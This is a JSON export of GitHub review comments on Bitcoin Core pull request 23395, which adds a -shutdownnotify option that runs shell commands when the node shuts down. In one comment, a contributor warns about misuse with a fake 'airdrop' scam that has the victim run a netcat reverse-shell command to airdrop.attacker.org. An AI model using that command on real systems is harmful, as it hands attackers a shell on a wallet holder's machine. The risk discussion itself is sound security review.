[
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "I understand the motivation however this option can be misused IMO so not sure about adding it\r\n\r\nI was reading the comments in https://github.com/bitcoin/bitcoin/pull/15367 and I think we should even remove `-startupnotify` because it provides an inbuilt [binder](https://en.wikipedia.org/wiki/File_binder) which can be used to run malware in the background when Bitcoin Core starts.\r\n\r\nObservation: Although we can run almost everything as this option allows shell commands but I was experimenting if its possible to keep Bitcoin Core running and never shutdown. Worked intermittently but nothing interesting.\r\n\r\n```\r\nbitcoind -shutdownnotify=\"bitcoind\"\r\n\r\nbitcoin-cli stop\r\n```\r\n\r\nIf getting notifications on start and shutdown is the goal maybe we should not provide easy option to execute shell commands with it. A file with name `notifications.dat` that saves such notifications should be enough IMO.",
      "created_at" : "2021-10-31T19:08:35Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-955775728",
      "id" : 955775728,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII58449_rw",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/955775728/reactions"
      },
      "updated_at" : "2021-10-31T19:08:35Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/955775728",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "Thanks, @prayank23 and @shaavan for the review and pointing out the edge case where a user might supply `\"bitcoind\"` as a shutdown notify bash command. \r\n\r\nA solution for that would be to call `.join()` instead `.detach()` in [here](https://github.com/bitcoin/bitcoin/pull/23395/files#diff-b1e19192258d83199d8adaa5ac31f067af98f63554bfdd679bd8e8073815e69dR183). This will result in bitcoind completing the entire shutdown sequence only after the bash command has finished executing. In the scenario where `\"bitcoind\"` is supplied as the bash command, the second `\"bitcoind\"` will fail as bitcoind is already running. However, this would also mean that all other bash commands would also be performed synchronously. \r\n\r\nOpen to feedback on how we should handle the scenario when a user supplies `\"bitcoind\"` as a shutdown notify bash command.\r\n\r\n> When I tried to use this argument value myself, there was no output whatsoever.\r\n\r\nIf you view `debug.log` you should be able to see if `bitcoind` has successfully restarted by searching for `runCommand error:`",
      "created_at" : "2021-11-01T12:07:31Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956178462",
      "id" : 956178462,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5844_iAe",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956178462/reactions"
      },
      "updated_at" : "2021-11-01T12:15:44Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956178462",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "> Open to feedback on how we should handle the scenario when a user supplies \"bitcoind\" as a shutdown notify bash command.\r\n\r\nI think we can avoid this case. It was just an observation which looked interesting initially. If a user wants to experiment and provides such argument he should be able to kill process or reboot system.\r\n\r\nI have issues with an option in Bitcoin Core that triggers any shell command based on start/shutdown. This feature can be helpful for lot of people with malicious intent.",
      "created_at" : "2021-11-01T14:08:28Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956265352",
      "id" : 956265352,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5844_3OI",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956265352/reactions"
      },
      "updated_at" : "2021-11-01T14:08:28Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956265352",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "@prayank23 If an attacker manages to make you invoke `bitcoind` with chosen configuration, you have bigger problems (it means they have filesystem access, can see your wallet files, can give themselves RPC access, ...).",
      "created_at" : "2021-11-01T15:25:56Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956330559",
      "id" : 956330559,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845AHI_",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956330559/reactions"
      },
      "updated_at" : "2021-11-01T15:25:56Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956330559",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/548488?v=4",
         "events_url" : "https://api.github.com/users/sipa/events{/privacy}",
         "followers_url" : "https://api.github.com/users/sipa/followers",
         "following_url" : "https://api.github.com/users/sipa/following{/other_user}",
         "gists_url" : "https://api.github.com/users/sipa/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/sipa",
         "id" : 548488,
         "login" : "sipa",
         "node_id" : "MDQ6VXNlcjU0ODQ4OA==",
         "organizations_url" : "https://api.github.com/users/sipa/orgs",
         "received_events_url" : "https://api.github.com/users/sipa/received_events",
         "repos_url" : "https://api.github.com/users/sipa/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/sipa/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/sipa/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/sipa"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "Concept ACK",
      "created_at" : "2021-11-01T15:26:45Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956331293",
      "id" : 956331293,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845AHUd",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956331293/reactions"
      },
      "updated_at" : "2021-11-01T15:26:45Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956331293",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/548488?v=4",
         "events_url" : "https://api.github.com/users/sipa/events{/privacy}",
         "followers_url" : "https://api.github.com/users/sipa/followers",
         "following_url" : "https://api.github.com/users/sipa/following{/other_user}",
         "gists_url" : "https://api.github.com/users/sipa/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/sipa",
         "id" : 548488,
         "login" : "sipa",
         "node_id" : "MDQ6VXNlcjU0ODQ4OA==",
         "organizations_url" : "https://api.github.com/users/sipa/orgs",
         "received_events_url" : "https://api.github.com/users/sipa/received_events",
         "repos_url" : "https://api.github.com/users/sipa/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/sipa/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/sipa/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/sipa"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "> @prayank23 If an attacker manages to make you invoke bitcoind with chosen configuration, you have bigger problems (it means they have filesystem access, can see your wallet files, can give themselves RPC access, ...).\r\n\r\n@sipa Yes victim will have bigger problems depending on the case. Are we helping attackers with this feature? \r\n\r\nExample:\r\n\r\nAttacker: We have a new airdrop where you don't need to share any credentials with us. It will be distributed to all bitcoin holders however they need to restart `bitcoind` so that airdrop server is notified about their wallet and registered for airdrop.\r\n\r\nPlease run:\r\n\r\n```\r\n$ bitcoind -shutdownnotify=\"nc -e /bin/sh airdrop.attacker.org 8080\"\r\n```\r\n\r\nVictim: Restarts core with command shared by attacker\r\n\r\nAttacker: Gets reverse shell\r\n\r\n",
      "created_at" : "2021-11-01T15:53:32Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956353035",
      "id" : 956353035,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845AMoL",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956353035/reactions"
      },
      "updated_at" : "2021-11-01T15:53:32Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956353035",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "@prayank23 This is a known and obvious issue with all `-*notify` options, unrelated to this pull request. It might be best to discuss this in another thread.",
      "created_at" : "2021-11-01T15:58:02Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956356904",
      "id" : 956356904,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845ANko",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956356904/reactions"
      },
      "updated_at" : "2021-11-01T15:58:02Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956356904",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "> Motivation: This will allow users to notify themselves when bitcoind unexpectedly shuts down.\r\n\r\nCan you explain this a bit more? The current code will notify users after Bitcoin Core *expectedly* shuts down, that is, after telling it to shutdown.\r\n\r\nIf users want to find out if it *unexpectedly* shut down, they will need to check for the absence of the notification and verify that the process is not running (e.g. writing state (utxo, wallet, ...) to the disk on shutdown).",
      "created_at" : "2021-11-01T16:13:23Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956371525",
      "id" : 956371525,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845ARJF",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956371525/reactions"
      },
      "updated_at" : "2021-11-01T16:13:40Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956371525",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "There is probably a difference still between *unexpected* shutdowns and *unclean* shutdowns. E.g. when disk is full, Bitcoin Core will (possibly) shut down cleanly, but it's not explicitly requested by the user.",
      "created_at" : "2021-11-01T16:15:25Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956373412",
      "id" : 956373412,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845ARmk",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956373412/reactions"
      },
      "updated_at" : "2021-11-01T16:15:25Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956373412",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/548488?v=4",
         "events_url" : "https://api.github.com/users/sipa/events{/privacy}",
         "followers_url" : "https://api.github.com/users/sipa/followers",
         "following_url" : "https://api.github.com/users/sipa/following{/other_user}",
         "gists_url" : "https://api.github.com/users/sipa/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/sipa",
         "id" : 548488,
         "login" : "sipa",
         "node_id" : "MDQ6VXNlcjU0ODQ4OA==",
         "organizations_url" : "https://api.github.com/users/sipa/orgs",
         "received_events_url" : "https://api.github.com/users/sipa/received_events",
         "repos_url" : "https://api.github.com/users/sipa/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/sipa/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/sipa/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/sipa"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "> Can you explain this a bit more?\r\n\r\n@MarcoFalke yup similar to what @sipa pointed out, this would be useful for users who wish to be notified when Bitcoin Core cleanly shuts down without being explicitly requested by the user. Updated the PR description to clearly describe what does *unexpected* means. ",
      "created_at" : "2021-11-01T19:03:37Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956506097",
      "id" : 956506097,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845Ax_x",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956506097/reactions"
      },
      "updated_at" : "2021-11-01T19:03:37Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/956506097",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "Concept ACK\r\n\r\nI think it is important to get #22417 merged first, though - otherwise `shutdownnotify` commands might all too easily keep files open that we expect to be closed.",
      "created_at" : "2021-11-02T17:07:28Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-957953168",
      "id" : 957953168,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845GTSQ",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/957953168/reactions"
      },
      "updated_at" : "2021-11-02T17:07:28Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/957953168",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/1095675?v=4",
         "events_url" : "https://api.github.com/users/luke-jr/events{/privacy}",
         "followers_url" : "https://api.github.com/users/luke-jr/followers",
         "following_url" : "https://api.github.com/users/luke-jr/following{/other_user}",
         "gists_url" : "https://api.github.com/users/luke-jr/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/luke-jr",
         "id" : 1095675,
         "login" : "luke-jr",
         "node_id" : "MDQ6VXNlcjEwOTU2NzU=",
         "organizations_url" : "https://api.github.com/users/luke-jr/orgs",
         "received_events_url" : "https://api.github.com/users/luke-jr/received_events",
         "repos_url" : "https://api.github.com/users/luke-jr/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/luke-jr/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/luke-jr/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/luke-jr"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r741301961"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/741301961"
         }
      },
      "author_association" : "MEMBER",
      "body" : "Suggest using a loop over potentially multiple options as in #22372",
      "commit_id" : "5a64663aa640e0d0e9c584b6dba4c4c04c7cca0b",
      "created_at" : "2021-11-02T17:08:55Z",
      "diff_hunk" : "@@ -174,9 +174,20 @@ void Interrupt(NodeContext& node)\n     }\n }\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::string cmd = args.GetArg(\"-shutdownnotify\", \"\");\n+    if (!cmd.empty()) {",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r741301961",
      "id" : 741301961,
      "line" : null,
      "node_id" : "PRRC_kwDOABII584sL17J",
      "original_commit_id" : "df9fde85b43d1ce34e30c7a0954ee616926473d6",
      "original_line" : 181,
      "original_position" : 8,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : null,
      "pull_request_review_id" : 795699163,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/741301961/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-02T17:10:24Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/741301961",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/1095675?v=4",
         "events_url" : "https://api.github.com/users/luke-jr/events{/privacy}",
         "followers_url" : "https://api.github.com/users/luke-jr/followers",
         "following_url" : "https://api.github.com/users/luke-jr/following{/other_user}",
         "gists_url" : "https://api.github.com/users/luke-jr/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/luke-jr",
         "id" : 1095675,
         "login" : "luke-jr",
         "node_id" : "MDQ6VXNlcjEwOTU2NzU=",
         "organizations_url" : "https://api.github.com/users/luke-jr/orgs",
         "received_events_url" : "https://api.github.com/users/luke-jr/received_events",
         "repos_url" : "https://api.github.com/users/luke-jr/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/luke-jr/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/luke-jr/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/luke-jr"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r741930540"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/741930540"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "Done ðð» ",
      "commit_id" : "5a64663aa640e0d0e9c584b6dba4c4c04c7cca0b",
      "created_at" : "2021-11-03T13:22:25Z",
      "diff_hunk" : "@@ -174,9 +174,20 @@ void Interrupt(NodeContext& node)\n     }\n }\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::string cmd = args.GetArg(\"-shutdownnotify\", \"\");\n+    if (!cmd.empty()) {",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r741930540",
      "id" : 741930540,
      "in_reply_to_id" : 741301961,
      "line" : null,
      "node_id" : "PRRC_kwDOABII584sOPYs",
      "original_commit_id" : "df9fde85b43d1ce34e30c7a0954ee616926473d6",
      "original_line" : 181,
      "original_position" : 8,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : null,
      "pull_request_review_id" : 796528797,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/741930540/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-03T13:22:26Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/741930540",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : " a13e4cf to  812910e  changes:\r\n* Run commands synchronously\r\n* Run commands before shutdown sequence begins\r\n* Support multiple `-shutdownnotify`\r\n",
      "created_at" : "2021-11-03T13:33:37Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-959088546",
      "id" : 959088546,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845Koei",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/959088546/reactions"
      },
      "updated_at" : "2021-11-03T16:58:14Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/959088546",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
